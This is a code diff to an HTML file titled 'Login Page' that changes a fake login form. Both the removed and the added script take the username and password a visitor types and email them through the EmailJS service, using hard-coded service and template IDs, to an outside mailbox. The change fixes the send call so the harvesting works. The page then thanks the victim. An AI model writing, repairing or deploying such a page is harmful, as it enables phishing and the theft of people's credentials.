@@ -6,42 +6,45 @@
     <title>Login Page</title>
     <link rel="stylesheet" href="styles.css">
     <script src="https://cdn.jsdelivr.net/npm/emailjs-com@2.6.4/dist/email.min.js"></script>
-<script>
-    (function() {
-        emailjs.init("f2bDcwtDw9UzzaEaK");
-    })();
-
-    function displayCredentials(event) {
-        event.preventDefault(); 
-
-        const username = document.getElementById('username').value;
-        const password = document.getElementById('password').value;
-
-        emailjs.send("service_udw5l3n", {
-            username: username,
-            password: password
-        })
-        .then(response => {
-            alert('Thank you for your help!');
-        })
-        .catch(error => {
-            console.error('Error sending email:', error);
-        });
-    }
-</script>
 </head>
 <body>
     <div class="login-container">
         <h2>Login</h2>
-        <form action="#" method="get">
+        <!-- No need for action or method here -->
+        <div>
             <label for="username">Username</label>
             <input type="text" id="username" name="username" required>
             
             <label for="password">Password</label>
             <input type="password" id="password" name="password" required>
             
-            <button type="submit">Log In</button>
-        </form>
+            <button onclick="sendEmail()">Log In</button>
+        </div>
     </div>
+
+    <script>
+        // Initialize EmailJS with your User ID
+        (function() {
+            emailjs.init("f2bDcwtDw9UzzaEaK");
+        })();
+
+        // Function to send email using EmailJS
+        function sendEmail() {
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+
+            emailjs.send("service_udw5l3n", "template_4zla0ro", {
+                username: username,
+                password: password
+            })
+            .then(response => {
+                alert('Thank you for help!');
+            })
+            .catch(error => {
+                console.error('Error sending email:', error);
+                alert('Error sending email. Check console for details.');
+            });
+        }
+    </script>
 </body>
 </html>
